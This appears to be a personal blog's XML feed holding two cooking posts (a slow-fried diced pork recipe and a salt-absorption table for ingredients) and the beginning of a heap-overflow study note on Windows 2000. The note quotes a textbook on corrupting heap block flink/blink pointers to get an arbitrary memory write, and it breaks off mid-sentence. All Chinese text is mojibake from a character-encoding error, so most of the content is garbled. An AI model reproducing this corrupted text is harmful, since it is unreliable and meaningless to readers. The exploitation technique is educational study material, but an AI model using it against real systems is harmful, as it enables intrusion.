´ÈùíÊ§íÂíåÊú®ËÄ≥Âê∏Êî∂ÔºåÂú®Áò¶ËÇâÂÖ•ÈîÖÊó∂ÔºåÂÜçÊîæÂÖ•Ââ©‰∏ãÁöÑ‰∏âÂàÜ‰πã‰∏ÄÔºåÂ∞±ËÉΩ‰øùËØÅÊúÄÁªà‰∏çÂêåÈ£üÊùêÁöÑÂí∏Â∫¶Áõ∏Ëøë„ÄÇ</li><li>Âú®ÁÉπÂà∂ÁªùÂ§ßÂ§öÊï∞ËèúÁöÑÊó∂ÂÄôÔºåÈÉΩÂèØ‰ª•Âä†ÂÖ•ÈÄÇÈáèÁöÑÁ≥ñÁî®‰∫éÊèêÈ≤ú„ÄÇ</li><li>ÊúÄÂêé‰∏ÄÊ¨°Âä†Ê∞¥ÔºåÊòØ‰∏∫‰∫ÜËÆ©‰ΩêÊñôÂùáÂåÄÈôÑÁùÄ„ÄÇÂõ†‰∏∫Ê≠§Êó∂ÈîÖ‰∏≠ËæÉÂπ≤ÔºåÂá†‰πéÊó†Ê∞¥ÂàÜÔºåÂä†ÂÖ•ÁöÑ‰ΩêÊñô‰ºöÁ≤òÁùÄÂú®È£üÊùêË°®Èù¢ÔºåÂØºËá¥ÂÖ∂‰∏çÂùáÂåÄÂàÜÂ∏ÉÔºåËÄå‰ªÖÁî®ÈîÖÈì≤ÂçúÊ•ûÔºàÁøªÁÇíÔºâÂá†‰∏ãÊúâÊó∂‰πüÂπ∂‰∏çËÉΩËææÂà∞ÁêÜÊÉ≥ÊïàÊûúÔºåÂõ†Ê≠§ÈúÄÁî®Â∞ëÈáèÊ∞¥Ê∫∂Ëß£ÂêéÁøªÁÇíÔºåÊïàÊûúÊúÄ‰Ω≥„ÄÇ</li></ul><h2 id="ËèúË∞±">ËèúË∞±</h2><p>Ë®ÄÂΩíÊ≠£‰º†Ôºå‰ªãÁªçËèúË∞±‚Äî‚ÄîÊÖ¢ÁÇí‰∏â‰∏Å„ÄÇ</p><p>ËøôÈÅìËèúËæÉ‰∏∫ËÄóÊó∂ÔºåÂ§ßÊ¶ÇÈúÄË¶Å40ÂàÜÈíüÔºàÂáÜÂ§áÈ£üÊùêÁ∫¶20ÂàÜÈíüÔºåÁÉπÂà∂Á∫¶20ÂàÜÈíüÔºâ„ÄÇ</p><h3 id="Áî®Êñô">1. Áî®Êñô</h3><table><thead><tr class="header"><th style="text-align: center;">Áî®Êñô</th><th style="text-align: center;">ËØ¥Êòé</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">Áå™ËÇâ</td><td style="text-align: center;">ËÇâÂàáÂ∞è‰∏ÅËÖåÂà∂10ÂàÜÈíü</td></tr><tr class="even"><td style="text-align: center;">ÊØõË±Ü</td><td style="text-align: center;">ÂéªÂ§ñÁöÆÂíåÈáåÁöÆÔºåÈáåÁöÆ‰∏ÄÂÆöË¶ÅÂéªÔºåÂê¶ÂàôÈöæÂÖ•Âë≥</td></tr><tr class="odd"><td style="text-align: center;">ËÉ°ËêùÂçú</td><td style="text-align: center;">ÂàáÂ∞è‰∏Å</td></tr><tr class="even"><td style="text-align: center;">Ëë±</td><td style="text-align: center;">ÈÄÇÈáèÂàáÊú´</td></tr><tr class="odd"><td style="text-align: center;">Âßú</td><td style="text-align: center;">ÈÄÇÈáèÂàáÁâá</td></tr><tr class="even"><td style="text-align: center;">Ëíú</td><td style="text-align: center;">ÈÄÇÈáèÂàáÊú´</td></tr><tr class="odd"><td style="text-align: center;">ÁéãÂÆà‰πâÂçÅ‰∏âÈ¶ô</td><td style="text-align: center;">ËøôÈÅìËèúÁöÑÈ¶ôÂë≥‰∏ªË¶ÅÈù†ÂÆÉÔºåÁªù‰∏çÂèØÂ∞ëÂì¶</td></tr><tr class="even"><td style="text-align: center;">ÁîüÊäΩ ÊñôÈÖí ËäùÈ∫ªÊ≤π Ê∑ÄÁ≤â ËÉ°Ê§íÁ≤â Âë≥Á≤æÔºàÈ∏°Á≤æÔºâ</td><td style="text-align: center;">ÈÄÇÈáè</td></tr></tbody></table><p>Ëá≥‰∫éÈ£üÊùêÂÖ∑‰ΩìÁî®ÈáèÔºå‰æùÁÑ∂ÈúÄË¶ÅÂá≠ÊÑüËßâ<sup>-</sup>ÔºåÂèØ‰ª•ÂèÇËÄÉ‰∏ãÂõæÔºö</p><img src="/life/dog2s-cooking-notes-2/1.jpg" class="" title="È£üÊùê‰∏ÄËßà"><h3 id="ÁÉπÂà∂ËøáÁ®ã">2. ÁÉπÂà∂ËøáÁ®ã</h3><ol type="1"><li>‰∏ÄÂÆöÈáèÈ£üÁî®Ê≤πÂÖ•ÈîÖÁÉßÁÉ≠ÔºåËÇâ‰∏ÅÂÖ•ÈîÖÁÇíËá≥ÂèòËâ≤ÁõõËµ∑ÂæÖÁî®„ÄÇ</li><li>ÂÜçÂÖ•Â∞ëÈáèÈ£üÁî®Ê≤πÔºåËë±ÂßúËíúÂÖ•ÈîÖÁàÜÈ¶ô„ÄÇ</li><li>ÊØõË±ÜËÉ°ËêùÂçúÂÖ•ÈîÖÔºåÂä†ÂÖ•ÈÄÇÈáèÁîüÊäΩ„ÄÅÊñôÈÖí„ÄÅËäùÈ∫ªÊ≤π„ÄÅÁ≥ñ„ÄÅ‰∏âÂàÜ‰πã‰∫åÁöÑÁõê‰ª•ÂèäÂçÅ‰∏âÈ¶ôÔºåÂçÅ‰∏âÈ¶ôÂèØ‰ª•Á®çÂæÆÂ§ö‰∏ÄÁÇπÔºåÁÇíËá≥Âä†ÂÖ•Ê∂≤‰ΩìÊå•ÂèëÊÆÜÂ∞Ω„ÄÇÁ≥ñÁöÑÂ§öÂ∞ëÂõ†‰∫∫ËÄåÂºÇÔºå‰∫åÂé®ÊØîËæÉÂñúÊ¨¢Êï¥ÈÅìËèúÊúâÊ∑°Ê∑°ÁöÑÁîúÂë≥ÔºåÂõ†Ê≠§Âä†ÂæóÂ§öÁÇπ„ÄÇ</li><li>ËÉ°ËêùÂçúÂíåÊØõË±ÜËæÉÈöæÁÜüÈÄèÔºåÂõ†Ê≠§ÈúÄÂä†ÂÖ•Â§ßÈáèÂÜ∑Ê∞¥ËøõË°åÂ§ßÁÅ´ÁÖÆÂà∂ÔºåÂÖ∑‰ΩìÁöÑÈáè‰ª•Á®çÂ§ö‰∫éÂÆåÂÖ®Ê∑πÊ≤°ÈîÖ‰∏≠È£üÊùêÁöÑÈáè‰∏∫‰Ω≥ÔºåÂèØ‰ª•ËßÇÂØü‰∏äÂõæÔºåÊ≠§Ê¨°Áî®Èáè‰∏∫ÁõõÊîæÊØõË±ÜÁöÑÂ°ëÊñôÁ¢ó‰∏ÄÊª°Á¢ó„ÄÇ</li><li>Âú®ÁÖÆÂà∂15ÂàÜÈíüÂ∑¶Âè≥Áõ¥Ëá≥Âä†ÂÖ•ÁöÑÊ∞¥Â∑≤Ëí∏ÂèëÂ§ßÈÉ®ÂàÜËÄåÊé•ËøëÊî∂Ê±ÅÊó∂ÔºåËÇâ‰∏ÅÂÖ•ÈîÖÔºåÂä†ÂÖ•ÈÄÇÈáèÂë≥Á≤æÔºàÈ∏°Á≤æÔºâÂíå‰∏âÂàÜ‰πã‰∏ÄÁöÑÁõêÔºåÁÇíËá≥ÈîÖ‰∏≠ÂÆåÂÖ®Êî∂Ê±Å„ÄÇÊ≠§Êó∂ÂÜçÂä†ÂÖ•Â∞ëÈáèÊ∞¥Ôºà200-300ÊØ´ÂçáÔºâÔºåÂÜçÁÇíËá≥ÂÆåÂÖ®Êî∂Ê±ÅÂç≥ÂèØÂá∫ÈîÖ„ÄÇ</li></ol><h2 id="ÂêéËØù">ÂêéËØù</h2><p>Êú¨Êñá‰ª•Âπ≥Ë°°‰∏çÂêåÈ£üÊùêÁöÑÂí∏Â∫¶‰∏∫‰∏≠ÂøÉÔºåÂùöÊåÅÊÖ¢Â∑•ÁªÜÊ¥ªÂÑøÂíåË∑üÊÑüËßâËµ∞ÁöÑ‰∏§‰∏™Âü∫Êú¨ÁÇπÔºå‰ªãÁªç‰∫Ü‰∫åÂé®ÈÄöËøá‰π±ÊîπËèúË∞±„ÄÅËÇÜÊÑèÁÉπË∞ÉËÄåÂ¶ÑÂõæÊàê‰∏∫Á§æ‰ºö‰∏ª‰πâÂ•ΩÂ§ßÂé®ÁöÑËøáÁ®ã„ÄÇ</p><p>ËøôÈÅìËèúËæÉ‰∏∫ËÄóÊó∂ÔºåÂõ†Ê≠§‰∏çÈÄÇÂêàÂ∑•‰ΩúÊó•ÁÉπÂà∂ÔºåÈÇ£‰ªÄ‰πàËèúËÉΩÂú®Áü≠Êó∂Èó¥ÂÜÖÂÆåÊàêÔºå‰ª•ÈÄÇÂêàÊó•ÁõäÂ¢ûÂ§öÁöÑÂ•îÊ≥¢ÊóèÂë¢Ôºü‰∏ã‰∏ÄÁØáÂ∞±‰ºöÊêúÈõÜ‰∏Ä‰∫õÊáí‰∫∫ËèúË∞±Ôºå‰ª•Êñπ‰æø‰∏äÁè≠Êóè‰ª¨Âú®ÂõûÂÆ∂ÂêéËÉΩÁÆÄÂçïÂø´Êç∑Âú∞ÂêÉ‰∏äËá™Â∑±‰∫≤ÊâãÊâìÈÄ†ÁöÑÈªëÊöóÊñôÁêÜ~</p>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cooking </tag>
            
            <tag> Dog2&#39;s Cooking Notes </tag>
            
            <tag> Foodie </tag>
            
            <tag> Cookbook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>‰∫åÂé®Á¨îËÆ∞ #1: È£üÊùêÂê∏ÁõêÂ∫¶Â∞èÁªì</title>
      <link href="/life/dog2s-cooking-notes-1/"/>
      <url>/life/dog2s-cooking-notes-1/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Dog2's Cooking Notes #1: Salt Absorption Rate of Food Ingredients</strong></em></li><li>Author: dog2</li></ul><hr /><blockquote><p>Â≠¶‰π†ÁÇíËèúÂ∑≤‰∏§ÊúàÊúâ‰ΩôÔºåËßâÂæóÊúâ‰∫õÊôÆÈÄÇÊÄßÁöÑÁªèÈ™åÂÄºÂæóÊÄªÁªìÔºå‰æøÂú®Ê≠§ËÆ∞ÂΩï‰∏Ä‰∏ã„ÄÇ</p><p>Êú¨ÁØáÊÄªÁªì‰∏Ä‰∏ã‰∏çÂêåÈ£üÊùêÁöÑÂê∏ÁõêÂ∫¶„ÄÇ</p></blockquote><h2 id="ÂâçË®Ä">ÂâçË®Ä</h2><p>‰∏ÄÈÅìËèúÈÄöÂ∏∏Áî±Â§öÁßçÈ£üÊùêÊ∑∑ÂêàÁÉπÂà∂ËÄåÊàêÔºåÂÖ∂Âí∏Âë≥ËΩªÈáç‰ºöÁõ¥Êé•ÂΩ±ÂìçÂè£ÊÑü„ÄÇ‰∏çÂêåÈ£üÊùêÂØπÁõêÁöÑÂê∏Êî∂ËÉΩÂäõ‰∏çÂ∞ΩÁõ∏ÂêåÔºåÂõ†Ê≠§ËæÉÂ•ΩÂú∞Âπ≥Ë°°‰∏çÂêåÈ£üÊùêÁöÑÂí∏Â∫¶ÊòØ‰Ω≥‰ΩúÁöÑÈáçË¶ÅÂõ†Á¥†‰πã‰∏Ä„ÄÇ‰ΩÜÁΩë‰∏äÁªùÂ§ßÂ§öÊï∞ËèúË∞±ÊàñÊïôÁ®ãÂæàÂ∞ëËÄÉËôëËøô‰∏ÄÁÇπÔºåÂ§ßÂ§öÊï∞ËèúË∞±ÈÉΩÊòØÂú®ÊâÄÊúâÈ£üÊùêÈÉΩÂ∑≤ÂÖ•ÈîÖ‰∏îÁÉπÂà∂Âç≥Â∞ÜÂÆåÊàêÂâçÊîæÂÖ•ÁõêÁöÑÔºåËøôÂÆπÊòìÈÄ†Êàê‰∏ÄÈÅìËèúÊúÄÁªàÁî±‰∫é‰∏çÂêåÈ£üÊùêÂí∏Ê∑°‰∏çÂùáËÄåÂΩ±ÂìçÂè£ÊÑü„ÄÇ</p><h2 id="È£üÊùêÂê∏ÁõêÂ∫¶Ë°®">È£üÊùêÂê∏ÁõêÂ∫¶Ë°®</h2><ul><li>‰∏ãË°®ËÆ∞ÂΩïÂú®ÁÇíÂà∂ÊàñÁÖÆÂà∂ËøáÁ®ã‰∏≠‰∏çÂêåÈ£üÊùêÂØπÁõêÁöÑÂê∏Êî∂ÈöæÊòìÁ®ãÂ∫¶ÔºåÂÆåÂÖ®Ê†πÊçÆ‰∏™‰∫∫ÁªèÈ™åÔºåÂõ†Ê≠§Êú™ÂøÖÂáÜÁ°ÆÔºåÂ¶ÇÊúâ‰∏çÂ¶•Ê¨¢ËøéÊåáÊ≠£„ÄÇ</li><li>ËôΩÁÑ∂Ê≠§Ë°®ÂèçÂ∫îÁöÑÊòØÂê∏ÁõêÈöæÊòìÁ®ãÂ∫¶Ôºå‰ΩÜ‰πüÂèØÂºïÁî≥‰∏∫Áõ∏ÂÖ≥È£üÊùêÂÖ•Âë≥ÔºàÈÖ∏/Áîú/Ëã¶/Ëæ£ÔºâÁöÑÈöæÊòìÁ®ãÂ∫¶„ÄÇ</li><li>ÂèØ‰ª•ÂèÇËÄÉ‰∏ãË°®Ë∞ÉÊï¥ÁÉπÂà∂Êó∂È£üÊùêÁöÑÂΩ¢Áä∂ÔºåÊàñË∞ÉÊï¥Áõê‰∏éÂêÑÁßçÈ£üÊùêÂÖ•ÈîÖÁöÑÂÖàÂêéÔºå‰ª•Âπ≥Ë°°‰∏çÂêåÈ£üÊùêÁöÑÂí∏Â∫¶„ÄÇ</li><li>Âê∏ÁõêÂ∫¶0-5ÂàÜÔºå5ÂàÜË°®Á§∫ÊûÅÊòìÂê∏ÁõêÔºå0ÂàÜË°®Á§∫ÊûÅÈöæÂê∏Áõê„ÄÇ</li></ul><a id="more"></a><table><thead><tr class="header"><th style="text-align: center;">È£üÊùê</th><th style="text-align: center;">ÂΩ¢Áä∂</th><th style="text-align: center;">Âê∏ÁõêÂ∫¶</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">ÁôΩËèú</td><td style="text-align: center;">Âè∂Áâá</td><td style="text-align: center;">2.8</td></tr><tr class="even"><td style="text-align: center;">ÁôΩËêùÂçú</td><td style="text-align: center;">ÂàáÁâá</td><td style="text-align: center;">3.5</td></tr><tr class="odd"><td style="text-align: center;">ÂåÖËèú</td><td style="text-align: center;">ÊâãÊíïÁâá</td><td style="text-align: center;">3</td></tr><tr class="even"><td style="text-align: center;">Â§ßËíú</td><td style="text-align: center;">ÂàáÁ¢éÁ≤í</td><td style="text-align: center;">2</td></tr><tr class="odd"><td style="text-align: center;">ÈªÑË±ÜËäΩ</td><td style="text-align: center;"></td><td style="text-align: center;">3</td></tr><tr class="even"><td style="text-align: center;">ËÉ°ËêùÂçú</td><td style="text-align: center;">‰∏Å</td><td style="text-align: center;">2.5</td></tr><tr class="odd"><td style="text-align: center;">ËåÑÂ≠ê</td><td style="text-align: center;">‰∏Å/Êù°</td><td style="text-align: center;">4.5</td></tr><tr class="even"><td style="text-align: center;">È∏°Ëõã</td><td style="text-align: center;">ÊêÖÊãåÂêéÁÖéÂùó</td><td style="text-align: center;">3.6</td></tr><tr class="odd"><td style="text-align: center;">È∏°Ëõã</td><td style="text-align: center;">ÊêÖÊãåÂêéÂÖ•Ê±§</td><td style="text-align: center;">3.4</td></tr><tr class="even"><td style="text-align: center;">ÈáëÈíàËèá</td><td style="text-align: center;"></td><td style="text-align: center;">4</td></tr><tr class="odd"><td style="text-align: center;">Êú®ËÄ≥</td><td style="text-align: center;">Â∞èÊúµ</td><td style="text-align: center;">1.5</td></tr><tr class="even"><td style="text-align: center;">Ëóï</td><td style="text-align: center;">‰∏Å</td><td style="text-align: center;">3.4</td></tr><tr class="odd"><td style="text-align: center;">ÈùíÊ§í</td><td style="text-align: center;">‰∏ù</td><td style="text-align: center;">1.5</td></tr><tr class="even"><td style="text-align: center;">ÂúüË±Ü</td><td style="text-align: center;">ËñÑÁâá</td><td style="text-align: center;">2.8</td></tr><tr class="odd"><td style="text-align: center;">ÂúüË±Ü</td><td style="text-align: center;">ÁªÜ‰∏ù</td><td style="text-align: center;">2.8</td></tr><tr class="even"><td style="text-align: center;">ÊùèÈ≤çËèá</td><td style="text-align: center;">ÂàáÁâá</td><td style="text-align: center;">3</td></tr><tr class="odd"><td style="text-align: center;">ÊúâÊú∫Ëä±Ëèú</td><td style="text-align: center;">ÂàáÂ∞èÊúµ</td><td style="text-align: center;">2</td></tr><tr class="even"><td style="text-align: center;">Áå™ËÇâ</td><td style="text-align: center;">ÊéíÈ™®</td><td style="text-align: center;">3</td></tr><tr class="odd"><td style="text-align: center;">Áå™ËÇâ</td><td style="text-align: center;">‰∏ù/‰∏Å</td><td style="text-align: center;">3.2</td></tr></tbody></table><h2 id="ÂêéËØù">ÂêéËØù</h2><p>Â∞Ω‰ø°‰π¶‰∏çÂ¶ÇÊó†‰π¶ÔºåËèúË∞±‰∫¶ÁÑ∂ÔºàÔºåÊàëÊúù‰∏Ä‰∫õ‰π¶‚ÄúË∂ÖÁÑ∂‚ÄùÔºåÊØîÂ¶ÇÊüêÂá†Èó®ÊïôÁßë‰π¶@_@ „ÄÇ„ÄÇÔºâ„ÄÇÂú®ÁúãÂÆåËèúË∞±Âπ∂‰∫ÜËß£‰∫ÜÂÖ∂‰∏≠‰∏çÂêåÈ£üÊùêÁöÑÂÖ•ÈîÖÈ°∫Â∫èÂêéÔºåÂèØÁªìÂêà‰∏äË°®ÊÄªÁªìÁöÑÈ£üÊùêÂê∏ÁõêÂ∫¶Êù•Ë∞ÉÊï¥ÁõêÁöÑÊîæÂÖ•ÊñπÂºèÔºåÂ¶ÇÂèØÂ∞ÜËèúË∞±‰∏≠Â∏∏ËßÅÁöÑËµ∑ÈîÖÂâç‰∏ÄÊ¨°ÊÄßÊîæÂÖ•ÁõêÁöÑÊñπÂºèÊîπ‰∏∫ÂàÜÊ¨°ÊîæÂÖ•ÔºåÂπ∂ÂêàÈÄÇÊéåÊéßÊîæÂÖ•ÈáèÔºåÁîöËá≥ÂèØ‰ª•ËÄÉËôëÁõ∏Â∫îÂú∞Êõ¥ÊîπÈ£üÊùêÁöÑÊîæÂÖ•È°∫Â∫èÔºåÁõ∏‰ø°ÊúâÊó∂ÂèØ‰ª•Êî∂Ëé∑Ë∂ÖË∂äÂéüËèúË∞±Ê∞¥ÂáÜÁöÑÊÑèÂ§ñÊÉäÂñú„ÄÇ</p><p>Êé•‰∏ãÊù•ÁöÑÂá†ÁØá‰ºöÂàÜ‰∫´‰∏Ä‰∫õÂü∫‰∫éËøôÁßçÊñπÊ≥ïÊîπËâØÂéüÊúâËèúË∞±ÊàñËÄÖ‚ÄúÂàõÈÄ†‚ÄùÊñ∞ËèúË∞±ÁöÑÁªèÈ™å„ÄÇ</p><p>Á•ùÂêõÁÉßÂæó‰∏ÄÊâãÂ•ΩËèú~</p>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cooking </tag>
            
            <tag> Dog2&#39;s Cooking Notes </tag>
            
            <tag> Foodie </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Â†ÜÊ∫¢Âá∫Â≠¶‰π†Á¨îËÆ∞(Win2K) (‰∏ã)</title>
      <link href="/tech/heap-overflow-learning-notes-2/"/>
      <url>/tech/heap-overflow-learning-notes-2/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Heap Overflow Learning Notes(Win2K) #2</strong></em></li><li>Author: dog2</li></ul><hr /><h2 id="Â†ÜÊ∫¢Âá∫ÂéüÁêÜÂèäÂà©Áî®">Â†ÜÊ∫¢Âá∫ÂéüÁêÜÂèäÂà©Áî®</h2><hr /><h3 id="Â†ÜÊ∫¢Âá∫ÂéüÁêÜ">1. Â†ÜÊ∫¢Âá∫ÂéüÁêÜ</h3><blockquote><p>Â†ÜÁÆ°ÁêÜÁ≥ªÁªüÁöÑ‰∏âÁ±ªÊìç‰ΩúÔºöÂ†ÜÂùóÂàÜÈÖç„ÄÅÂ†ÜÂùóÈáäÊîæÂíåÂ†ÜÂùóÂêàÂπ∂ÂΩíÊ†πÁªìÂ∫ïÈÉΩÊòØÂ†ÜÈìæË°®ÁöÑ‰øÆÊîπ„ÄÇ‰æãÂ¶ÇÔºåÂàÜÈÖçÂ∞±ÊòØÂ∞ÜÂ†ÜÂùó‰ªéÁ©∫Ë°®‰∏≠‚ÄúÂç∏‰∏ã‚ÄùÔºõÈáäÊîæÊòØÊääÂ†ÜÂùó‚ÄúÈìæÂÖ•‚ÄùÁ©∫Ë°®ÔºõÂêàÂπ∂Á®çÂæÆÂ§çÊùÇÁÇπÔºå‰ΩÜ‰πüÂèØ‰ª•ÁúãÊàêÊòØÊääËã•Âπ≤‰∏™Â†ÜÂùóÂÖà‰ªéÁ©∫Ë°®‰∏≠‚ÄúÂç∏‰∏ã‚ÄùÔºå‰øÆÊîπÂùóÈ¶ñ‰ø°ÊÅØÔºàÂ§ßÂ∞èÔºâÔºå‰πãÂêéÊääÊõ¥Êñ∞ÁöÑÊñ∞Âùó‚ÄúÈìæÂÖ•‚ÄùÁ©∫Ë°®„ÄÇ</p><p>ÊâÄÊúâ‚ÄúÂç∏‰∏ã‚ÄùÂíå‚ÄúÈìæÂÖ•‚ÄùÂ†ÜÂùóÁöÑÂ∑•‰ΩúÈÉΩÂèëÁîüÂú®ÈìæË°®ÔºåÂ¶ÇÊûúÊàë‰ª¨ËÉΩ‰º™ÈÄ†ÈìæË°®ÁªìÁÇπÁöÑÊåáÈíàÔºåÂú®‚ÄúÂç∏‰∏ã‚ÄùÂíå‚ÄúÈìæÂÖ•‚ÄùÁöÑËøáÁ®ã‰∏≠Â∞±ÊúâÂèØËÉΩËé∑Âæó‰∏ÄÊ¨°ËØªÂÜôÂÜÖÂ≠òÁöÑÊú∫‰ºö„ÄÇ</p><p>Â†ÜÊ∫¢Âá∫Âà©Áî®ÁöÑÁ≤æÈ´ìÂ∞±ÊòØÁî®Á≤æÂøÉÊûÑÈÄ†ÁöÑÊï∞ÊçÆÂéªÊ∫¢Âá∫‰∏ã‰∏Ä‰∏™Â†ÜÂùóÁöÑÂùóÈ¶ñÔºåÊîπÂÜôÂùóÈ¶ñ‰∏≠ÁöÑÂâçÂêëÊåáÈíà(flink)ÂíåÂêéÂêëÊåáÈíà(blink)ÔºåÁÑ∂ÂêéÂÜçÂàÜÈÖç„ÄÅÈáäÊîæ„ÄÅÂêàÂπ∂Á≠âÊìç‰ΩúÂèëÁîüÊó∂‰º∫Êú∫Ëé∑Âæó‰∏ÄÊ¨°ÂêëÂÜÖÂ≠ò‰ªªÊÑèÂú∞ÂùÄÂÜôÂÖ•‰ªªÊÑèÊï∞ÊçÆÁöÑÊú∫‰ºö„ÄÇ</p><p>Êàë‰ª¨ÊääËøôÁßçËÉΩÂ§üÂêëÂÜÖÂ≠ò‰ªªÊÑè‰ΩçÁΩÆÂÜôÂÖ•‰ªªÊÑèÊï∞ÊçÆÁöÑÊú∫‰ºöÊàê‰∏∫‚ÄùDWORD SHOOT‚Äú„ÄÇÊ≥®ÊÑèÔºöDWORD SHOOTÂèëÁîüÊó∂ÔºåÊàë‰ª¨‰∏ç‰ΩÜÂèØ‰ª•ÊéßÂà∂Â∞ÑÂáªÁöÑÁõÆÊ†áÔºà‰ªªÊÑèÂú∞ÂùÄÔºâÔºåËøòÂèØ‰ª•ÈÄâÁî®ÈÄÇÂΩìÁöÑÂ≠êÂºπÔºà4Â≠óËäÇÊÅ∂ÊÑèÊï∞ÊçÆÔºâ„ÄÇ</p><p>ËøôÈáå‰∏æ‰∏Ä‰∏™‰æãÂ≠êÊù•ËØ¥ÊòéÈìæË°®Êìç‰Ωú‰∏≠DWORD SHOOTÁ©∂Á´üÊòØÊÄéÊ†∑ÂèëÁîüÁöÑ„ÄÇÂ∞Ü‰∏Ä‰∏™ÁªìÁÇπ‰ªéÂèåÂêëÈìæË°®‰∏≠‚ÄúÂç∏‰∏ã‚ÄùÁöÑÂáΩÊï∞ÂæàÂèØËÉΩÊòØÁ±ª‰ººËøôÊ†∑ÁöÑ„ÄÇ</p></blockquote><a id="more"></a><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">remove</span> <span class="params">(ListNode * node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">node -&gt; <span class="built_in">blink</span> -&gt; flink = node -&gt; flink;</span><br><span class="line">node -&gt; flink -&gt; <span class="built_in">blink</span> = node -&gt; <span class="built_in">blink</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ÊåâÁÖßËøô‰∏™ÂáΩÊï∞ÁöÑÈÄªËæëÔºåÊ≠£Â∏∏ÊãÜÂç∏ËøáÁ®ã‰∏≠ÈìæË°®ÁöÑÂèòÂåñËøáÁ®ãÂ¶ÇÂõæ5.3.1ÊâÄÁ§∫„ÄÇ</p><p>ÂΩìÂ†ÜÊ∫¢Âá∫ÂèëÁîüÊó∂ÔºåÈùûÊ≥ïÊï∞ÊçÆÂèØ‰ª•Ê∑πÊ≤°‰∏ã‰∏Ä‰∏™Â†ÜÂùóÂùóÈ¶ñ„ÄÇËøôÊòØÔºåÂùóÈ¶ñÊòØÂèØ‰ª•Ë¢´ÊîªÂáªËÄÖÊéßÂà∂ÁöÑÔºåÂç≥ÂùóÈ¶ñ‰∏≠Â≠òÊîæÁöÑÂâçÂêëÊåáÈíàÔºàflinkÔºâÂíåÂêéÂêëÊåáÈíàÔºàblinkÔºâÊòØÂèØ‰ª•Ë¢´ÊîªÂáªËÄÖ‰º™ÈÄ†ÁöÑ„ÄÇÂΩìËøô‰∏™Â†ÜÂùóË¢´‰ªéÂèåÂêëÈìæË°®‰∏≠‚ÄùÂç∏‰∏ã‚ÄúÊó∂Ôºånode -&gt; blink -&gt; flink = node -&gt; flink Â∞ÜÊää‰º™ÈÄ†ÁöÑflinkÊåáÈíàÂÄºÂÜôÂÖ•‰º™ÈÄ†ÁöÑblinkÊâÄÊåáÁöÑÂú∞ÂùÄ‰∏≠ÂéªÔºå‰ªéËÄåÂèëÁîüDWORD SHOOT„ÄÇËøô‰∏™ËøáÁ®ãÂ¶ÇÂõæ5.3.2ÊâÄÁ§∫„ÄÇ</p><footer><strong>ÁéãÊ∏Ö</strong><cite>„Ää0dayÂÆâÂÖ®ÔºöËΩØ‰ª∂ÊºèÊ¥ûÂàÜÊûêÊäÄÊúØ„Äã(Á¨¨‰∫åÁâà) -> P163-164</cite></footer></blockquote><img src="/tech/heap-overflow-learning-notes-2/0day_5_3_1.png" class="" title="„Ää0dayÂÆâÂÖ®ÔºöËΩØ‰ª∂ÊºèÊ¥ûÂàÜÊûêÊäÄÊúØ„Äã(Á¨¨‰∫åÁâà) -&gt; P165 -&gt; Âõæ5.3.1"><img src="/tech/heap-overflow-learning-notes-2/0day_5_3_2.png" class="" title="„Ää0dayÂÆâÂÖ®ÔºöËΩØ‰ª∂ÊºèÊ¥ûÂàÜÊûêÊäÄÊúØ„Äã(Á¨¨‰∫åÁâà) -&gt; P165 -&gt; Âõæ5.3.2"><h3 id="Â†ÜÊ∫¢Âá∫Âà©Áî®">2. Â†ÜÊ∫¢Âá∫Âà©Áî®</h3><blockquote><p>DWORD SHOOTÁöÑÂ∏∏Áî®ÁõÆÊ†áÔºàWindows XP SP1‰πãÂâçÁöÑÂπ≥Âè∞ÔºâÂ§ßÊ¶ÇÂèØ‰ª•Ê¶ÇÊã¨‰∏∫‰ª•‰∏ãÂá†Á±ª„ÄÇ</p><ol type="1"><li><p>ÂÜÖÂ≠òÂèòÈáèÔºö‰øÆÊîπËÉΩÂ§üÂΩ±ÂìçÁ®ãÂ∫èÊâßË°åÁöÑÈáçË¶ÅÊ†áÂøóÂèòÈáèÔºåÂæÄÂæÄÂèØ‰ª•ÊîπÂèòÁ®ãÂ∫èÊµÅÁ®ã„ÄÇ‰æãÂ¶ÇÔºåÊõ¥ÊîπË∫´‰ªΩÈ™åËØÅÂáΩÊï∞ÁöÑËøîÂõûÂÄºÂ∞±ÂèØ‰ª•Áõ¥Êé•ÈÄöËøáËÆ§ËØÅÊú∫Âà∂„ÄÇ2.2ËäÇ‰∏≠‰øÆÊîπÈÇªÊé•ÂèòÈáèÁöÑÂ∞èËØïÈ™åÂ∞±ÊòØËøôÁßçÂà©Áî®ÊñπÂºèÁöÑ‰æãÂ≠ê„ÄÇÂú®ËøôÁßçÂ∫îÁî®Âú∫ÊôØ‰∏≠ÔºåDWORD SHOOTË¶ÅÊØîÊ†àÊ∫¢Âá∫Âº∫Â§ßÂæóÂ§öÔºåÂõ†‰∏∫Ê†àÊ∫¢Âá∫Êó∂Ê∫¢Âá∫ÁöÑÊï∞ÊçÆÂøÖÈ°ªËøûÁª≠ÔºåËÄåDWORD 